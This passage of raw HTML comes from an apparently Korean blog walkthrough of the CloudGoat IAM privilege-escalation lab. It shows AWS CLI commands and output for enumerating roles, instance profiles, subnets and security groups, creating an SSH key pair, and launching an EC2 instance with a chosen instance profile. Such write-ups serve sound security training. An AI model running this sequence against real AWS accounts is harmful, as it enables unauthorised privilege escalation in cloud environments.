class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>해당 정보를 통해서 <code class=\"language-text\">cg-super-critical-security-server</code> 가 사용하다는 것을 알 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">super-critical-security-server</code></pre></div>\n<ul>\n<li>IAM 사용자 “Kerrigan” 으로서 우리는 EC2 “Instance Profile” 과 관련된 정보를 검색할 수 가 있습니다.</li>\n<li>인스턴스 프로파일은 Single IAM Rule Container입니다.</li>\n<li>EC2 인스턴스에 IAM Rule을 직접 할당할 수 는 없지만 Rule이 포함된 인스턴스 프로파일은 할당할 수 있습니다.</li>\n<li>사용 가능한 인스턴스 프로필등을 나열하여 확인해보았습니다.  아래의 명령을 통해 cloudgoat가 규칙으로 모든 리소스의 이름을 다음으로 <code class=\"language-text\">--query</code> 로 <code class=\"language-text\">cg</code> 로 시작하는 인스턴스 Rule을 쿼리하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-instance-profiles --query <span class=\"token string\">\"InstanceProfiles[?starts_with(InstanceProfileName, 'cg')]\"</span> --profile kerrigan\n\nInstanceProfileName -> (문자열)\n\n인스턴스 프로파일을 식별하는 이름입니다.</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABf0lEQVQoz31S147CQBBbeieEkEYIJRBK6AcIOF17uf//JJ88YRFI6B6sWW3GE9s7KggXyBctDEZrgePHMK0hao0u2p0ROk4kaLUHaLZ6dzSMFIYZwjD7sOwIpYoDFQ4SVOs+ev0E43iP1eYd08UR8eyAze4Dy80Vy/UFw2gjg213AtePYbtjgT6zlqsuVLc3R7MVYvf2hcXqLIPnyUkGWPborrJY7qBQegadETwXyzZyhTaU7URQqopKzYVpDYRMxWzgHzVIJCGbN6USerDKGlCqnlavO71Pp3QqjSY7bPefYv9w+sH++I3+cCXqmTO/S413ciYvzdBOM2x3hnC8iagjyQtmYBSj8VaIXncG15+KA/5YW9WgID7Ig+UalGrIRbK64Hz9lQfiw/DVSaA1IWQNZHKtJ4jV271yvDFUxrg1px+ZmR/MRLFeB50ZFZHILF9Bud4ESjXvF7o56CeSD9chRWq5UvP+H8jFfBzESjVcWobMBeeis0/b0n2vBv8B5gL2x5a+cc4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png\"\n        srcset=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/e9ff0/7.png 180w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/f21e7/7.png 360w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png 720w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/cc488/7.png 928w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>AWS 게정에는 <code class=\"language-text\">cg-ec2-meek-instance-profile-[CLOUD_GOAT_ID]</code> , <code class=\"language-text\">cg-ec2-meek-role-[CLOUD_GOAT_ID]</code> 형태의 패턴으로 IAM Rule에 대한 정보를 확인할 수있습니다.</li>\n<li>IAM 사용자 kerrigan으로서 IAM Rule과 관련된 정보를 검색할수도 있습니다. 해당 부분에서 사용할 수 있는 IAM 역활들을 나열해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-roles --query <span class=\"token string\">\"Roles[?starts_with(RoleName, 'cg')]\"</span> --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB10lEQVQ4y41T127jMBCkUlwl0VaX5SJZ7jUNuMQH5DH//0cTzMqUU+6CPCxIguLszOxIKctFqxNjvf2DNFvBDwsEcYkwnsle98ewdQZHD9HzxnB7I/T9HEE0he0OoJQDZWkQx7ruQRGMj8r5PQbDFTa7ZyzWT9gdT7h/fEVeHpAMFojTuVSYzOozQf1wWjdotiModiaTxeoJm/0z8ukB++NJQKPz4yAqcdsMcNPwv1WjFaLRCmS9vvWg1JUW2pSz3b9gNNkiSubo+xN5IJJEViXpa8n7q2qtzjd9sHjgmmZLTIo9kmwpflFGx07FZ/PtT6UMmAGkH9loLd5QMvdkT9BfARogMqFPXWcg+1YnksmyjLT/gRiMmmG7myCMS3hhIQy7TiqsKn/tD/7oS1n6n01qQErzghwdO5F8kSn3vKN/nGK7G9fn6j49N3UvOSSg7WbYHU4YjjeyMuTM4d3DqwyImWNGec9hsTnTwJVpoBpWsx1C9byJfFiUR4zznXw0WzxgOrtDOlzJmcMhK8OUHrMq1okwpZoqZmc/CPby902A5stHASIAu3JYn/z7Wmc/a8mysbR05J9BL8mc3Y03v4mMDIXdLxPScHQGLyjEdN4ZsI9Z/QnwHYWuToIOK7dhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png\"\n        srcset=\"/static/aa89ce317f2ef72519163ed73e63236d/e9ff0/8.png 180w,\n/static/aa89ce317f2ef72519163ed73e63236d/f21e7/8.png 360w,\n/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png 720w,\n/static/aa89ce317f2ef72519163ed73e63236d/c0255/8.png 920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 두 IAM Rule 계정을 확인할 수 가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<ul>\n<li>RoleName에서 확인할 수 있듯이 meek, mighty 키워드를 통해 권한 레벨을 확인할 수 가 있습니다. 뜻 그대로 meek &#x3C; mighty 레벨 입니다. 이러한 권한 으로 인해 접근 제한이 되어 액세스 거부 문제가 발생할 수 있습니다.</li>\n</ul>\n<h3 id=\"권한-역활을-파악하는-방법\" style=\"position:relative;\"><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\" aria-label=\"권한 역활을 파악하는 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>권한 역활을 파악하는 방법</h3>\n<ul>\n<li>EC2 인스턴스에 연결하고 EC2를 사용하여 역할 권한을 열거하는 것입니다.</li>\n<li>IAM 역할은 EC2에 직접 연결할 수 없으며 인스턴스 프로파일에 Wrapping되어야 합니다.</li>\n<li>해당 방법을 사용하려면 AWS 계정의 인스턴스 프로필을 사용하여 EC2 인스턴스를 생성할 수 있어야 합니다.</li>\n<li>EC2 인스턴스를 생성을 하기 전에 필요한 데이터가 있어야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. EC2 Instance 를 시작할 subnet\n<span class=\"token number\">2</span>. EC2 Instance에 대한 SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. EC2 Instance에 SSH로 연결하는데 사용할 수 있는 SSH key-pair\n\n-> 삭제 대상 EC2 머신과 동일한 Subnet을 사용할 수 있습니다.\nsubnet-04d05182b53c1ff11</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQY022OzU7CUBgFP6VA2kZo7y3UUqH1gsUAIiYQFQ0gvxFZ6MKtL+Ir+M5jQJcsJjmbMxkxrRtMq0eSXpOaLr3OHeFoRbU9JDVtOjrjvTBg7XTJbI1SMSc5j1xeYRX0P3/71PKRp+cF09mKyWTJfPnK+mVF4+2L9nTHZrvlozfnp/7Jd3PHTMVcxAbJeZT9Op5K0JVLfJ2gqwbbPUdEHGw3IowySl4Dv2KoBQlR2EQFBikqpKQRVyGWQuTsULKvPIb0B2OGoymP4yX34wX92wfyQRPbb1BWMYFT48pKSIt1dFHjuNXDcS89xi9DvWnTI5WYSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/588d8302d877fe5484458d00c4bd1492/37523/9.png\"\n        srcset=\"/static/588d8302d877fe5484458d00c4bd1492/e9ff0/9.png 180w,\n/static/588d8302d877fe5484458d00c4bd1492/f21e7/9.png 360w,\n/static/588d8302d877fe5484458d00c4bd1492/37523/9.png 720w,\n/static/588d8302d877fe5484458d00c4bd1492/b7877/9.png 891w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>인스턴스에서 필요한 subnet 부분을 쿼리로 검색한 결과 2개의 데이터가 출력이 되었습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n    --query 'Reservations<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.Instances<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.<span class=\"token punctuation\">[</span>SecurityGroups<span class=\"token punctuation\">]</span>' \\\n    --output text --profile kerrigan\n\nsg-04ffcf8e873ee2103    cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\nsg-063079fb3bea2c77e    cg-ec2-http-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQY01XOW0+CcACGcSxn2VA0TcSYC0Hw0F9seCBMUPFYzWrW+jpd9bWfJhetLp797t690uQhZhFvGQwDptGKOJzT3n2ixR/MwxnxaMFXYct3451DyaTndMnKGjlFp1i6oVwxuSwbiUqxjqRqNnq9y/lFNdGyPYyGwGz0MKw+dntIrSnIFGpkchqyoiPnrzlJF0mdFhL/JjUdj7tBxPh+laTWHEyrT6vlJWMd4WO7PropcISP0xlRqVqcZSukM6Xf0aPHpMl0zWb3xnK1Z7l+wbZdRLDGDZ+JZlsW4SOvYsPB3/M0jvFHEbduQFf4XKkWUir/7+EPpSdz1axWD8wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png\"\n        srcset=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/e9ff0/10.png 180w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/f21e7/10.png 360w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png 720w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/4ef49/10.png 890w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>앞서 출력된 서브넷 정보와 보안 그룹을 열거하고 EC2 인스턴스에 대한 SSH 액세스를 허용하는 보안 그룹을 분석하였습니다.</li>\n</ul>\n<h3 id=\"ec2-key-pair-생성\" style=\"position:relative;\"><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\" aria-label=\"ec2 key pair 생성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Key pair 생성</h3>\n<ul>\n<li>앞선 필요한 정보들을 수집한후 AWS 계정에서 기존 key-pair를 사용할 수 없기 때문에 새로운 SSH key-pair를 생성하였습니다. 생성할 수 있는 EC2 머신에서 SSH 연결하려면 새로운 key-pair가 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 create-key-pair \\\n    --key-name fake-ec2  \\\n    --query 'KeyMaterial' \\\n    --output text > fake-ec2.pem \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACP0lEQVQ4y4VRXU9TQRBdeovQNoQC8lVLkEIpFNr7uXv3fu+9t6UFUR6UByX6QtAnE302/vZjZgsaE8SHkzMzmzk7Z4YFXQ9+x0W8LzB4OUCra6J2HKG928PB3gnszT7CXRfhrgO5YyHa85B0OOIOR96ViA4Frhsuvi5leNvwwL5F1/gxucPP6BPe8Qs4yRh9OUHvlMM7lrht5fjSLvH5HrdbCjdNiZsViY+rIT6sBbh75uP7QoL3Cy6Yl05gyhwnIoNIJvBlCcEVHE/B5gpmVOJUKtjJSHP7yAJjNTBW/wOjDlapgRkNMI8r2E6KoRlp5n4By03hcKVj11Pw/RJCUJyh13NhGE1Uq6t/Yf6eWZJdIEqmSNUrUFyMrnQcRGezmrpAXr7Rb5T3TyXmjCYq1ZVHwagxTKaI0ik8v0AQT+AHI3ii0KJxeq5rYTzRgt0jF6yy/G9B2pXlpHC8DKYdw3ISbZVANYIfjDXbXoa9A/PpCR8s++FYN9JEBKrTpDRVll8iIS4ucTKQT09ItgjUzGUJGY4169wv9GfiPif0jvnTE5IVlysM7Ri2m8EVObhfziy66W/bQyvSHxz+b4d0wTg714fRVx5fIR9dIUrPkeYzu3QQeiPLdOVHBY0ZGAmRlQfbQXiGJJ1q66p4rS9M+xPBCAMzQufA0oJkmxlNzFVmzKrLYNUmmCcUhCxAzIVCfxhgc9/G9otDtHeO0Gr3dNxY2sZC7Tlq9Q0s1tc11xubWGxsYG1+C22jhXVjC78Ac5+De3qwFowAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png\"\n        srcset=\"/static/33d226002a7b47a93a98a8cfc082615f/e9ff0/11.png 180w,\n/static/33d226002a7b47a93a98a8cfc082615f/f21e7/11.png 360w,\n/static/33d226002a7b47a93a98a8cfc082615f/37523/11.png 720w,\n/static/33d226002a7b47a93a98a8cfc082615f/136a2/11.png 884w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 key-pair를 생성하였습니다.</li>\n<li>새로운 EC2 인스턴스를 생성하는 데 있어서 필요한 모든 정보들을 수집하였고 이에 대해 EC2 인스턴스를 생성하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABQUlEQVQoz51R207CQBDtT+EPgPwG/g6PQISv0fRR+wDPhsQovdcqTQvstT1mtt1qiCHESU5mZ3bmzNlZZ/seIQhjvGxf4YcxHh5d3E0muF+ukOVf2AURgjhFmGZ42wUIohR+mCBKMvhR65Ms784fcISqoXQNJiTInp49jMe3mM3mJmZcQiptIKRqYeL6B7r1Sjdw0FlT18av12uMRiOsVksT113+WnOapgFBa20Sm80Gw+EQ83mrkPK25hr0Ci2h53m4GQwwnU7/R1iVBYqiAOfCEPi+j8ViAdd1LxKaNf1FyBnD8XhEVVUoy7Ivtvs7J+Gc43A4mFrqsTidTma4ebIQAkkcmwtqYIz1yjopvdo0SbDf700PDaQcwQ43n0JE9GwqIjILKWVfaAk/8xyM8cu/THKJjAjOQfnfa1BKXdzhN6ye+s4328RsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png\"\n        srcset=\"/static/2538f46ed86b9378dbc55894c66ee7c3/e9ff0/12.png 180w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/f21e7/12.png 360w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/37523/12.png 720w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/302a4/12.png 1080w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/07a9c/12.png 1440w,\n/static/2538f46ed86b9378dbc55894c66ee7c3/1f038/12.png 1481w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. 대상 EC2 인스턴스와 동일한 서브넷\n<span class=\"token number\">2</span>. SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. SSH 인증을 위한 SSH 키 쌍으로 새로 생성\n<span class=\"token number\">4</span>. cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu 인스턴스 프로필 연결\n\naws ec2 run-instances \\\n    --image-id ami-0a313d6098716f372 \\\n    --instance-type t2.micro \\\n    --iam-instance-profile Arn=arn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --key-name fake-ec2 \\\n    --subnet-id subnet-04d05182b53c1ff11 \\\n    --security-group-ids sg-04ffcf8e873ee2103 \\\n    --region us-east<span class=\"token number\">-1</span> \\\n    --profile kerrigan\n\narn<span class=\"token operator\">:</span>aws<span class=\"token operator\">:</span>iam<span class=\"token operator\">:</span><span class=\"token operator\">:</span>&lt;USERID><span class=\"token operator\">:</span>instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: 